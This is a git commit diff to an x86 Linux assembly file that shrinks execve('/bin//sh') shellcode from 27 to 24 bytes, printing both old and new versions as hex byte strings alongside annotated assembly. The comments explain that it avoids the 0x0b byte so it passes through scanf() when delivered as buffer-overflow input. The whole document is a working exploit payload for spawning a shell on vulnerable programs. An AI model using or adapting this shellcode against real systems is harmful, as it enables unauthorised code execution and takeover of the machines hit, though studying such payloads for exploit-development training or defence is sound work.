2ab1c16436d6bf99738e3ed20b979de85889cb0a
Pinky <36157015+PinkP4nther@users.noreply.github.com>
2019-03-16 01:22:09 -0700

    Shrinked to 24 bytes

--- linux_x86_execve_no_whitespace.asm
+++ linux_x86_execve_no_whitespace.asm
@@ -8,21 +8,22 @@
 ; The point of this shellcode is to bypass when 0x0b (11) is a bad byte.
 ; This helped when giving overflow input to scanf() for example.
 ; scanf() sees 0x0b as white space therefore ending the read from STDIN.
-; 27 bytes.
+; 24 bytes.
 
-sc = ("\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\xb8\xff\xff\xff\xff\x83\xe8\xf4\xcd\x80")
+; sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0e\x2c\x03\xcd\x80"
 
 section .text
 
 global _start
 
 _start:
-	xor ecx,ecx ; Zero ecx
-	push ecx ; Put 0 on the stack
+	xor eax,eax     ; Zero eax
+	push eax        ; Put 0 on the stack
 	push 0x68732f2f ; Push //sh on the stack
 	push 0x6e69622f ; Push /bin on the stack
-	mov ebx,esp ; Move /bin//sh\0 into ebx
-	xor edx,edx ; Zero out edx
-	mov eax,0xffffffff ; Move max 32 bit unsigned integer into eax
-	sub eax,0xfffffff4 ; Subtract from eax to create 0xb
-	int 0x80 ; Software interrupt for system call
+	mov ebx,esp     ; Move /bin//sh into ebx
+	cdq             ; Zero edx
+	xor ecx,ecx     ; Zero ecx
+	mov al,0xe      ; Move 0xe into al register (closest ascii code to 0xb thats not whitespace)
+	sub al,0x3      ; Subtract from eax to create 0xb
+	int 0x80        ; Software interrupt for system call
